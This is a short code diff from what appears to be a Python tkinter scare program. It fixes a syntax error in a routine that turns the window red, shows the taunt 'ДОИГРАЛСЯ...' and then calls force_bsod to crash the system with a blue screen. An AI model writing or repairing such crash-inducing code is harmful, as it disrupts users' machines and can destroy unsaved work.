@@ -509,7 +509,7 @@ def main():
                 
                 for w in win.winfo_children():
                     w.destroy()
-                win.configure(bg="#FF0000"
+                win.configure(bg="#FF0000")
                 tk.Label(win, text="ДОИГРАЛСЯ...", fg="#000000", bg="#FF0000", font=("Impact", 60), justify="center").pack(expand=True, fill="both")
                 win.after(3000, force_bsod)
 
